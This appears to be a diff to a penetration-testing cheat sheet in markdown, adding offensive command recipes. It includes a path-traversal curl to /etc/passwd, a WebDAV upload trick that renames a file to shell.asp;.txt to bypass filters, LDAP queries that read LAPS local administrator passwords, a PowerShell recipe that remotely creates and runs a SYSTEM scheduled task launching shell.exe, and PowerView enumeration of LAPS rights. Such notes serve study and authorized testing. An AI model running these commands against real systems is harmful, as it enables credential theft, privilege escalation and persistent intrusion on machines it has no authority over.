@@ -131,6 +131,25 @@ Set inputs to 0
 	curl --path-as-is http://123.123.123.123/../../../../../etc/passwd
 `--path-as-is` is required as curl will squash `../` by default  
 
+### WebDAV
+If WebDAV is present from nmap scan,  
+
+	cadaver http://123.123.123.123
+Use to upload/copy/move files
+
+	move shell.txt shell.asp;.txt
+If `.asp` files cannot be directly uploaded, use `move` or `copy` to bypass filters  
+
+## LDAP
+	ldapsearch -x -H ldap://192.168.150.122 -b "dc=domain,dc=com"
+Anonymous LDAP query  
+
+	ldapsearch -x -H ldap://192.168.150.122 -D "CN=USERNAME,CN=Users,DC=domain,DC=com" -w 'PASSWORD' -b "dc=domain,dc=com"
+Auth'd LDAP query  
+
+	ldapsearch -x -H ldap://192.168.150.122 -D "CN=USERNAME,CN=Users,DC=domain,DC=com" -w 'PASSWORD' -b "dc=domain,dc=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+Query admin password from LAPS  
+
 ## Injections
 ### Commands injections
 	...; id #
@@ -451,6 +470,12 @@ powershell
 	netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 cmd  
 
+## Windows - Create Schtask and invoke
+	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
+	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
+	Invoke-Command -Computer COMPUTERNAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\path\to\shell.exe /ru SYSTEM } -Credential $credential
+	Invoke-Command -Computer COMPUTERNAME -ScriptBlock { schtasks /run /tn shell } -Credential $credential
+
 ## Linux - file transfer
 	cat filename | base64 -w 0;echo
 Convert file into clipboard contents  
@@ -584,6 +609,13 @@ Compile the .so and inject it
 	Get-NetUser
 	Get-NetComputer
 	Find-LocalAdminAccess
+
+## AD - Check LAPS
+	Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
+Use powerview to see if LAPS are enabled for any machines  
+
+	Find-AdmPwdExtendedRights -Identity * | fl
+See who can see LAPS  
 
 ## AD - GenericWrite/GenericAll
 1. Set account to no-preauth, asrep roast, crack hash  
